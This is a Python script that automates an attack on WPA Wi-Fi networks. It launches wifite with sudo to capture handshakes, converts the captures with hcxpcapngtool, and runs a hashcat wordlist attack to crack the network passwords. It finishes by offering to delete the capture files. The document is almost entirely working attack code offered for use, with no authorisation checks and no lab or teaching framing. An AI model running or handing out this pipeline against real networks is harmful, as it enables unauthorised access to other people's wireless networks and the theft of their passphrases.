import subprocess
from pathlib import Path
import time
import sys

# Logging utilities
def log_header(msg):
    print(f"\n\033[1;34m[==>] {msg}\033[0m")

def log_info(msg):
    print(f"\033[1;36m[*] {msg}\033[0m")

def log_success(msg):
    print(f"\033[1;32m[+] {msg}\033[0m")

def log_warn(msg):
    print(f"\033[1;33m[!] {msg}\033[0m")

def log_error(msg):
    print(f"\033[1;31m[✖] {msg}\033[0m")

def show_banner():
    banner = r"""

 █████   ███   █████  ███     ██████   ███   █████                      
░░███   ░███  ░░███  ░░░     ███░░███ ░░░   ░░███                       
 ░███   ░███   ░███  ████   ░███ ░░░  ████  ███████    ██████           
 ░███   ░███   ░███ ░░███  ███████   ░░███ ░░░███░    ███░░███          
 ░░███  █████  ███   ░███ ░░░███░     ░███   ░███    ░███████           
  ░░░█████░█████░    ░███   ░███      ░███   ░███ ███░███░░░            
    ░░███ ░░███      █████  █████     █████  ░░█████ ░░██████           
     ░░░   ░░░      ░░░░░  ░░░░░     ░░░░░    ░░░░░   ░░░░░░            
                                                                        
                                                                        
                                                                        
                                                                        
                                ███                                     
                               ░███                                     
                            ███████████                                 
                           ░░░░░███░░░                                  
                               ░███                                     
                               ░░░                                      
                                                                        
                                                                        
                                                                        
                                                                        
 █████   █████                   █████                          █████   
░░███   ░░███                   ░░███                          ░░███    
 ░███    ░███   ██████    █████  ░███████    ██████   ██████   ███████  
 ░███████████  ░░░░░███  ███░░   ░███░░███  ███░░███ ░░░░░███ ░░░███░   
 ░███░░░░░███   ███████ ░░█████  ░███ ░███ ░███ ░░░   ███████   ░███    
 ░███    ░███  ███░░███  ░░░░███ ░███ ░███ ░███  ███ ███░░███   ░███ ███
 █████   █████░░████████ ██████  ████ █████░░██████ ░░████████  ░░█████ 
░░░░░   ░░░░░  ░░░░░░░░ ░░░░░░  ░░░░ ░░░░░  ░░░░░░   ░░░░░░░░    ░░░░░  
                                                                        
                                                                        
                                                                        



"""
    diagram = r"""
┌──────────────────┐       ┌──────────────────────────┐       ┌────────────────────┐
│   Wifite Attack   ├──────►  Capture WPA Handshake   ├──────►  .cap to .hc22000   │
└──────────────────┘       └──────────────────────────┘       └────────┬───────────┘
                                                                       ▼
                                                       ┌──────────────────────────-┐
                                                       │   Hashcat Wordlist Attack │
                                                       └──────────────────────────-┘
"""
    print(f"\033[1;35m{banner}\033[0m")
    print(f"\033[0;36m{diagram}\033[0m")


# Core Functions
def run_wifite():
    log_header("Starting Wifite")
    log_info("Launching Wifite for WPA handshake attack...")
    subprocess.run(['sudo', 'wifite', '--kill', '--no-wps', '--wpa', '--skip-crack'], check=True)
    log_success("Wifite session completed.")

def convert_to_hc22000():
    log_header("Converting .cap to .hc22000")
    hs_dir = Path.cwd() / 'hs'
    cap_files = list(hs_dir.glob("*.cap"))

    if not cap_files:
        log_warn("No .cap files found in hs/")
        return [], []

    hc_files = []
    for cap in cap_files:
        out_file = cap.with_suffix(".hc22000")
        result = subprocess.run(['sudo','hcxpcapngtool', '-o', str(out_file), str(cap)])
        if result.returncode == 0:
            log_success(f"Converted {cap.name} ➜ {out_file.name}")
            hc_files.append(out_file)
        else:
            log_error(f"Failed to convert {cap.name}")
    return cap_files, hc_files


def select_hashcat_device():
    log_header("Selecting Hashcat Device")
    subprocess.run(['hashcat', '-I'])
    device_id = input("\n[?] Enter the device ID to use with Hashcat: ").strip()
    return device_id

def select_wordlist():
    log_header("Choosing Wordlist")
    wordlist_dir = Path.cwd() / 'wordlists'
    wordlists = sorted(wordlist_dir.glob('*'))

    if not wordlists:
        log_error("No wordlists found in wordlists/ directory.")
        return None

    print("\nAvailable Wordlists:")
    for i, wl in enumerate(wordlists):
        print(f"  {i + 1}. {wl.name}")

    while True:
        try:
            choice = int(input("[?] Select a wordlist by number: "))
            if 1 <= choice <= len(wordlists):
                log_success(f"Selected wordlist: {wordlists[choice - 1].name}")
                return str(wordlists[choice - 1])
            else:
                log_warn("Invalid selection. Try again.")
        except ValueError:
            log_warn("Please enter a valid number.")

def run_hashcat(hc_file, device_id, wordlist):
    log_header(f"Cracking: {hc_file.name}")
    log_info(f"Using device {device_id} with wordlist: {Path(wordlist).name}")
    cmd = [
        'hashcat', '-m', '22000', '-a', '0', str(hc_file),
        wordlist,
        '--force', '--status', '--status-timer=10',
        '-d', device_id
    ]
    subprocess.run(cmd)
    log_success(f"Hashcat session completed for {hc_file.name}")

def cleanup_capture_files(cap_files, hc_files):
    log_header("Cleanup Step")
    print("\n[?] What files would you like to delete?")
    print("  1. Delete only .cap files")
    print("  2. Delete only .hc22000 files")
    print("  3. Delete both")
    print("  4. Skip file deletion")

    choice = input("Enter your choice [1-4]: ").strip()

    if choice == '1' or choice == '3':
        log_info("Deleting .cap files...")
        for file in cap_files:
            try:
                file.unlink()
                log_info(f"Deleted {file.name}")
            except Exception as e:
                log_warn(f"Could not delete {file.name}: {e}")

    if choice == '2' or choice == '3':
        log_info("Deleting .hc22000 files...")
        for file in hc_files:
            try:
                file.unlink()
                log_info(f"Deleted {file.name}")
            except Exception as e:
                log_warn(f"Could not delete {file.name}: {e}")

    if choice == '4':
        log_info("Skipping file deletion.")
    else:
        log_success("Cleanup completed.")

def main():
    show_banner()
    run_wifite()
    cap_files, hc_files = convert_to_hc22000()
    if not hc_files:
        log_error("No .hc22000 files to crack. Exiting.")
        sys.exit(1)

    device_id = select_hashcat_device()
    wordlist = select_wordlist()
    if not wordlist:
        log_error("No valid wordlist selected. Exiting.")
        sys.exit(1)

    for hc_file in hc_files:
        run_hashcat(hc_file, device_id, wordlist)

    cleanup_capture_files(cap_files, hc_files)
    log_success("All tasks completed. Exiting.")


if __name__ == "__main__":
    main()
